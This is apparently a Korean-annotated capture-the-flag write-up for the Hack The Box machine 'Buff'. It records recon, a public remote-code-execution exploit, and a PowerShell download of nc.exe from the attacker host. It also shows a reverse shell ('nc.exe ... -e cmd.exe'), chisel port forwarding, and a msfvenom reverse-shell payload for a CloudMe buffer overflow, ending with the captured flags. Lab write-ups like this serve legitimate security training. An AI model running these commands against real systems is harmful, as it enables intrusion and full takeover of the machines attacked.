@@ -1,0 +1,112 @@
+Machine: Buff
+TARGET: 10.129.2.18
+
+
+nmap -sV -sC -oA nmap/Buff $ip   
+
+PORT     STATE SERVICE VERSION                                                                                                                       
+8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)                                                                        
+|_http-title: mrb3n's Bro Hut                                                                                                                        
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6                                                                                 
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+
+Apache 2.4.43, PHP 7.4.6 사용중
+
+헬스 서비스 웹사이트 같음
+
+http://10.129.2.18:8080/contact.php 접속하면
+
+mrb3n's Bro Hut
+Made using Gym Management Software 1.0
+
+
+https://www.exploit-db.com/exploits/48506 
+exploitdb에서 Gym Management Software 1.0 Unauthenticated Remote Code Execution 취약점 존재
+
+python2 exploit.py http://10.129.2.18:8080/   
+
+웹웹셸 연결성공
+
+C:\xampp\htdocs\gym\upload> type ..\..\..\..\Users\shaun\Desktop\user.txt
+�PNG
+▒
+
+> 4277a01cb57aa37a5e6aeeb90deb91c4
+
+현재 셸이 너무 불안정하므로 인터렉티브한셸로 전환
+
+cp /usr/share/windows-resources/binaries/nc.exe ./nc.exe   
+
+python3 -m http.server 80  
+
+powershell Invoke-WebRequest -Uri http://10.10.14.156/nc.exe -Outfile C:\Users\Public\nc.exe
+
+nc -nlvp 4444
+
+C:\Users\Public\nc.exe 10.10.14.156 4444 -e cmd.exe
+
+인터렉티브한 셸 획득
+
+
+
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+python3 -m http.server 80
+
+powershell -c "Invoke-WebRequest -Uri http://10.10.14.156/winPEASx64.exe -OutFile winpeas.exe"
+.\winpeas.exe
+winpeas.exe실행 취약점 탐색
+
+����������͹ Current TCP Listening Ports
+� Check for services restricted from the outside 
+  Enumerating IPv4 connections
+
+TCP        127.0.0.1             8888          0.0.0.0               0               Listening         3244            CloudMe
+
+https://www.exploit-db.com/exploits/48389   ClodeMe에 버퍼 오버플로우 취약점 존재
+
+애플리케이션 사용을위해 포트포워딩
+
+포트포워딩을 위해
+
+https://github.com/jpillora/chisel/releases
+chisel설치
+
+
+
+powershell -c "Invoke-WebRequest -Uri http://10.10.14.156:9999/chisel.exe -OutFile chisel.exe"
+
+./chisel server -p 8000 --reverse
+./chisel.exe client 10.10.14.156:8000 R:8888:127.0.0.1:8888
+
+포트포워딩 완료
+
+wget https://www.exploit-db.com/download/48389 -O cloudme_exploit.py
+
+
+msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.156 LPORT=7777 -b "\x00\x0a\x0d" -f python -v payload
+
+cloudme_exploit payload 수정
+
+nc -nlvp 7777
+
+python3 cloudme_exploit.py
+
+
+root셸 획득
+
+C:\Windows\system32>whoami
+whoami
+buff\administrator
+
+C:\Windows\system32>cd /Users
+
+
+type C:\Users\Administrator\Desktop\root.txt
+
+
+> 1d8332fbbb42c15032013d5e2fdd2655
+
+
+
+
